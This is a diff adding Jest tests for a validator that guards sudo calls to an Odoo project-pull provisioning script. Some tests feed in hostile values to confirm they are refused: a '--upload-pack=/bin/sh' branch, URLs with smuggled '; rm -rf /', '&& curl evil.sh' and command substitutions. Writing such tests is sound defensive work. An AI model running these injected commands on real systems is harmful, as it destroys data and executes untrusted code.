@@ -589,3 +589,151 @@ describe('assertProvisioningInvocation - HTTPS issuance', () => {
     ).not.toThrow();
   });
 });
+
+describe('assertProvisioningInvocation - project pull (ADR-049)', () => {
+  const createScripts = ['/opt/odoo/scripts/create_project', '/opt/odoo/scripts/create_project_enterprise'];
+  const grantScript = '/opt/cartenz/infrastructure/provisioning/grant-addons-write.sh';
+  const httpsScript = '/opt/cartenz/infrastructure/provisioning/setup-project-https.sh';
+  const pullScript = '/opt/cartenz/infrastructure/provisioning/pull-project.sh';
+
+  /** The fifth argument is what makes the pull shape reachable at all. */
+  const call = (args: readonly string[]) =>
+    assertProvisioningInvocation(args, createScripts, grantScript, httpsScript, pullScript);
+
+  it('permits a well-formed pull from an https remote', () => {
+    expect(() =>
+      call(['-n', pullScript, 'ggroma', 'https://github.com/BintangLinked/ggroma.git', 'main']),
+    ).not.toThrow();
+  });
+
+  it('permits a well-formed pull from an scp-style remote', () => {
+    expect(() =>
+      call(['-n', pullScript, 'linkederp-internal', 'git@github.com:LinkedERP/Odoo.git', 'main']),
+    ).not.toThrow();
+  });
+
+  it('permits a branch with the separators git itself allows', () => {
+    for (const branch of ['main', 'staging/uat', 'release-19.0', 'dev_2', 'v19.0.x']) {
+      expect(() => call(['-n', pullScript, 'name', 'https://github.com/o/r.git', branch])).not.toThrow();
+    }
+  });
+
+  /**
+   * A branch beginning with a hyphen is read by git as an option, not a ref.
+   * `--upload-pack=…` is the classic, and it runs a command on the remote host.
+   */
+  it('refuses a branch that would be read as an option', () => {
+    for (const branch of ['--upload-pack=/bin/sh', '-x', '--all']) {
+      expect(() =>
+        call(['-n', pullScript, 'name', 'https://github.com/o/r.git', branch]),
+      ).toThrow(CommandArgumentError);
+    }
+  });
+
+  it('refuses a remote that is not https or scp-style', () => {
+    for (const url of [
+      '',
+      'file:///opt/odoo/projects/other/addons',
+      '/opt/odoo/projects/other/addons',
+      'http://github.com/o/r.git',
+      'git://github.com/o/r.git',
+    ]) {
+      expect(() => call(['-n', pullScript, 'name', url, 'main'])).toThrow(CommandArgumentError);
+    }
+  });
+
+  it('refuses a remote carrying shell metacharacters', () => {
+    for (const url of [
+      'https://github.com/o/r.git; rm -rf /',
+      'https://github.com/o/r.git && curl evil.sh',
+      'https://github.com/o/r.git`id`',
+      'https://github.com/o/r.git$(id)',
+      'git@github.com:o/r.git;id',
+    ]) {
+      expect(() => call(['-n', pullScript, 'name', url, 'main'])).toThrow(CommandArgumentError);
+    }
+  });
+
+  it('refuses an invalid project name', () => {
+    for (const bad of ['', 'A', 'has space', 'has/slash', '-leading', 'x'.repeat(40)]) {
+      expect(() =>
+        call(['-n', pullScript, bad, 'https://github.com/o/r.git', 'main']),
+      ).toThrow(CommandArgumentError);
+    }
+  });
+
+  it('refuses extra arguments smuggled after the branch', () => {
+    expect(() =>
+      call(['-n', pullScript, 'name', 'https://github.com/o/r.git', 'main', '; rm -rf /']),
+    ).toThrow(CommandArgumentError);
+  });
+
+  it('refuses a pull missing its branch', () => {
+    expect(() => call(['-n', pullScript, 'name', 'https://github.com/o/r.git'])).toThrow(
+      CommandArgumentError,
+    );
+  });
+
+  /**
+   * The off switch. An operator who has not installed the script's sudoers entry
+   * leaves PROJECT_PULL_SCRIPT empty, and the invocation has to be refused at the
+   * process layer too — the sudoers gate and this one are independent by design.
+   */
+  it('refuses the pull script when it is not configured', () => {
+    expect(() =>
+      assertProvisioningInvocation(
+        ['-n', pullScript, 'name', 'https://github.com/o/r.git', 'main'],
+        createScripts,
+        grantScript,
+        httpsScript,
+        null,
+      ),
+    ).toThrow(/not a configured provisioning script/);
+  });
+
+  it('does not let an https-shaped argument reach the pull script through another entry', () => {
+    // The other three scripts are still exactly themselves; nothing about adding
+    // the pull shape widened the create shape's port check.
+    expect(() =>
+      assertProvisioningInvocation(
+        ['-n', pullScript, 'name', 'main'],
+        createScripts,
+        grantScript,
+        httpsScript,
+        pullScript,
+      ),
+    ).toThrow(CommandArgumentError);
+  });
+
+  it('still permits the create, grant and HTTPS shapes once pullScript is configured', () => {
+    const all = [createScripts[0], createScripts[1], grantScript, httpsScript, pullScript];
+
+    expect(() =>
+      assertProvisioningInvocation(['-n', all[0], 'name', '7001'], createScripts, grantScript, httpsScript, pullScript),
+    ).not.toThrow();
+
+    expect(() =>
+      assertProvisioningInvocation(
+        ['-n', all[0], 'name', '7001', '19.0'],
+        createScripts,
+        grantScript,
+        httpsScript,
+        pullScript,
+      ),
+    ).not.toThrow();
+
+    expect(() =>
+      assertProvisioningInvocation(['-n', grantScript, 'name'], createScripts, grantScript, httpsScript, pullScript),
+    ).not.toThrow();
+
+    expect(() =>
+      assertProvisioningInvocation(
+        ['-n', httpsScript, 'name', 'example.com', 'ops@example.com'],
+        createScripts,
+        grantScript,
+        httpsScript,
+        pullScript,
+      ),
+    ).not.toThrow();
+  });
+});
